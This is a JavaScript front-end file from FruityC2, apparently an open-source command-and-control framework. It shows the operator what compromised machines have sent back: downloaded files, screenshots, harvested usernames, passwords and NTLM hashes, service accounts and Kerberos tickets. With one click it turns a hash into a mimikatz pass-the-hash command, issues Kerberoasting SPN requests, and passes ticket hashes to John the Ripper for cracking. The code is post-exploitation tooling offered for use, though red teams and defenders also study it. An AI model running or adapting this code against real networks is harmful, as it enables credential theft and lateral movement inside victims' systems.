/*
# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

// DOWNLOADS
function load_downloads() {
    container_id = "container_downloads";
    $("#"+container_id).empty();
    
	content = "<div>";
	content += "<div style='display: inline-block; width: 20px;'></div>";
	//content += "<div style='display: inline-block; width: 60px; font-weight: bold;'>Size</div>";
    content += "<div style='display: inline-block; width: 200px; font-weight: bold;'>Name</div>";
    //content += "<div style='display: inline-block; width: 200px; font-weight: bold;'>Agent</div>";
	content += "</div>";
	
	$("#"+container_id).append(content);
	
	$.getJSON(FruityC2+"/downloads", function(obj) {
        $.each(obj, function(key, value) {
			content = "<div id='downloads_"+key+"'>";
			content += "<div style='display: inline-block; width: 20px;'><i class='fa fa-close' style='font-size:12px' onclick='downloads_del("+key+", \""+value+"\")'></i></div>";
			//content += "<div style='display: inline-block; width: 60px;'>N/A kb</div>";
            content += "<div style='display: inline-block; width: 200px;'><a href='"+FruityC2+'/data_download?dp=downloads&df='+value+"'>"+value+"</a></div>";
            //content += "<div style='display: inline-block; width: 200px;'>N/A</div>";
			content += "</div>";
			
			$("#"+container_id).append(content);
        });
    });
}

function downloads_del(key, value) {
	if(confirm("Delete Downlaod?")) {
		$.get(FruityC2+"/downloads/del", 'v=' + value, function(data) {});
		$("#downloads_"+key).remove();
	} else {
		return false;
	}
}

// SCREENSHOTS
function load_screenshots() {
    container_id = "container_screenshots";
    $("#"+container_id).empty();
    
	content = "<div>";
	content += "<div style='display: inline-block; width: 20px;'></div>";
    //content += "<div style='display: inline-block; width: 60px; font-weight: bold;'>Size</div>";
	content += "<div style='display: inline-block; width: 200px; font-weight: bold;'>Name</div>";
    //content += "<div style='display: inline-block; width: 200px; font-weight: bold;'>Agent</div>";
	content += "</div>";
	
	$("#"+container_id).append(content);
	
	$.getJSON(FruityC2+"/screenshots", function(obj) {
        $.each(obj, function(key, value) {			
			content = "<div id='screenshots_"+key+"'>";
			content += "<div style='display: inline-block; width: 20px;'><i class='fa fa-close' style='font-size:12px' onclick='screenshots_del("+key+", \""+value+"\")'></i></div>";
            //content += "<div style='display: inline-block; width: 60px;'>N/A kb</div>";
            content += "<div style='display: inline-block; width: 200px;'><a href='"+FruityC2+'/data_download?dp=screenshots&df='+value+"'>"+value+"</a></div>";
            //content += "<div style='display: inline-block; width: 200px;'>N/A</div>";
			content += "</div>";
			
			$("#"+container_id).append(content);
        });
    });
}

function screenshots_del(key, value) {
	if(confirm("Delete Screenshot?")) {
		$.get(FruityC2+"/screenshots/del", 'v=' + value, function(data) {});
		$("#screenshots_"+key).remove();
	} else {
		return false;
	}
}

// CREDENTIALS
function load_credentials_() {
    container_id = "container_credentials";
    $("#"+container_id).empty();
    
	content = "<div>";
	content += "<div style='display: inline-block; width: 20px;'></div>";
	content += "<div style='display: inline-block; width: 200px; font-weight: bold;'>Name</div>";
	content += "</div>";
	
	$("#"+container_id).append(content);
	
	$.getJSON(FruityC2+"/credentials", function(obj) {
        $.each(obj, function(key, value) {			
			content = "<div id='downloads_"+key+"'>";
			content += "<div style='display: inline-block; width: 20px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_del("+key+", \""+value+"\")'></i></div>";
			content += "<div style='display: inline-block; width: 100px;'>"+value.user+"</div>";
            content += "<div style='display: inline-block; width: 200px;'>"+value.pass+"</div>";
            content += "<div style='display: inline-block; width: 200px;'>"+value.domain+"</div>";
            content += "<div style='display: inline-block; width: 200px;'>"+value.source+"</div>";
            content += "<div style='display: inline-block; width: 200px;'>"+value.host+"</div>";
			content += "</div>";
			
			$("#"+container_id).append(content);
        });
    });
}

function load_credentials() {
    container_id = "container_credentials";
    $("#"+container_id).empty();
    
	content = "<table>";
	content += "<tr>";
	content += "<td></td>";
    content += "<td style='padding-right: 10px;font-weight: bold;'>User</td>";
    content += "<td style='padding-right: 10px;font-weight: bold;'>Pass</td>";
    content += "<td style='padding-right: 10px;font-weight: bold;'>Domain</td>";
    content += "<td style='padding-right: 10px;font-weight: bold;'>Source</td>";
    content += "<td style='padding-right: 10px;font-weight: bold;'>Host</td>";
	content += "</tr>";
	
	//$("#"+container_id).append(content)
	
	$.getJSON(FruityC2+"/credentials", function(obj) {
        $.each(obj, function(key, value) {			
			
            content += "<tr>";
            content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_del(\""+key+"\")'></i> </td>";
            content += "<td style='padding-right: 10px;' nowrap>"+value.user+"</td>";
            if (value.type == "hash") {
                content += "<td style='padding-right: 10px;'><a href='#' onclick='mimikatz_pth(\""+value.user+"\",\""+value.domain+"\",\""+value.pass+"\")'>"+value.pass+"</a></td>";
            } else {
                content += "<td style='padding-right: 10px;'>"+value.pass+"</td>";
            }
            content += "<td style='padding-right: 10px;'>"+value.domain+"</td>";
            content += "<td style='padding-right: 10px;'>"+value.source+"</td>";
            content += "<td style='padding-right: 10px;' nowrap>"+value.host+"</td>";
            content += "</tr>";
			
			//$("#"+container_id).append(content)
        });
        content += "</table>";
        $("#"+container_id).append(content);
    });   
}

function credentials_del(id) {
	if(confirm("Delete Credential?")) {
		$.get(FruityC2+"/credentials/del", 'id=' + id, function(data) {});
		//$("#credential_"+id).remove();
        load_credentials();
	} else {
		return false;
	}
}

function mimikatz_pth(user, domain, pass) {
    if (domain === "") { domain = "." ; }
    command = "mimikatz sekurlsa::pth /user:"+user+" /domain:"+domain+" /ntlm:"+pass;
    $("#control").val(command);
    modal_close("mCredentials");
    $("#control").focus();
    //alert(command);
}

function load_credentials_spn() {
    container_id = "container_credentials_spn";
    $("#"+container_id).empty();
    
	content = "<table>";
	content += "<tr>";
	content += "<td></td>";
    content += "<td style='font-weight: bold; padding-right: 10px;'>sAMAccountName</td>";
    content += "<td style='font-weight: bold; padding-right: 20px;'>ServicePrincipalName</td>";
    //content += "<td style='font-weight: bold; padding-right: 20px;'>Host</td>";
	content += "</tr>";
	
	//$("#"+container_id).append(content)
	
	$.getJSON(FruityC2+"/credentials/spn", function(obj) {
        $.each(obj, function(key, value) {			
			
            content += "<tr>";
            content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_spn_del(\""+key+"\")'></i> </td>";
            content += "<td style='padding-right: 20px;'>"+value.samaccountname+"</td>";
            content += "<td style='padding-right: 20px;'><a href='#' onclick='spn_request(\""+value.serviceprincipalname+"\")'>"+value.serviceprincipalname+"</a></td>";
            //content += "<td style='padding-right: 20px;' nowrap>"+value.host+"</td>";
            content += "</tr>";
			
			//$("#"+container_id).append(content)
        });
        content += "</table>";
        $("#"+container_id).append(content);
    });   
}

function spn_request(serviceprincipalname) {
    command = "spn_request "+serviceprincipalname;
    $("#control").val(command);
    modal_close("mCredentials");
    $("#control").focus();
}

function load_credentials_ticket() {
    container_id = "container_credentials_ticket";
    $("#"+container_id).empty();
    
	content = "<table>";
	content += "<tr>";
	content += "<td></td>";
    content += "<td style='font-weight: bold; padding-right: 10px;'>Host</td>";
    content += "<td style='font-weight: bold; padding-right: 10px;'>Server Name</td>";
    //content += "<td style='font-weight: bold; padding-right: 20px;'>serviceprincipalname</td>";
    //content += "<td style='font-weight: bold; padding-right: 20px;'>Host</td>";
	content += "</tr>";
	
	//$("#"+container_id).append(content)
	
	$.getJSON(FruityC2+"/credentials/ticket", function(obj) {
        $.each(obj, function(key, value) {			
			
            content += "<tr>";
            content += "<td style='padding-right: 10px;'><i class='fa fa-close' style='font-size:12px' onclick='credentials_ticket_del(\""+key+"\")'></i> </td>";
            content += "<td style='padding-right: 20px;'>"+value.host+"</td>";
            content += "<td style='padding-right: 20px;'><a href='#' data-toggle='modal' data-target='#mCredentialsJohn' onclick='get_john(\""+value.john+"\")'>"+value.servername+"</a></td>";
            //content += "<td style='padding-right: 20px;'><a href='#' onclick='spn_request(\""+value.serviceprincipalname+"\")'>"+value.serviceprincipalname+"</a></td>";
            //content += "<td style='padding-right: 20px;' nowrap>"+value.host+"</td>";
            content += "</tr>";
			
			//$("#"+container_id).append(content)
        });
        content += "</table>";
        $("#"+container_id).append(content);
    });   
}

function get_john(value) {
    $("#credentials_john").val(value);
}

/*
function data_download(data_path, data_file) {
    console.log(FruityC2+'/data_download?dp=' + data_path + '&df=' + data_file)
    $.get(FruityC2+"/data_download", 'dp=' + data_path + '&df=' + data_file, function(data) {});
}
*/